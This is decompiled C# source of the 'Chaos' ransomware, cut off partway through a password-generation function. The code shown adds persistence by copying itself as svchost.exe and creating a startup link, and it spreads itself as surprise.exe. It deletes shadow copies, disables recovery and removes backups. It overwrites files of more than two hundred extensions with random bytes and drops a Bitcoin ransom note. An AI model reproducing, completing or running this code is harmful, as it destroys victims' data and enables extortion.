using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
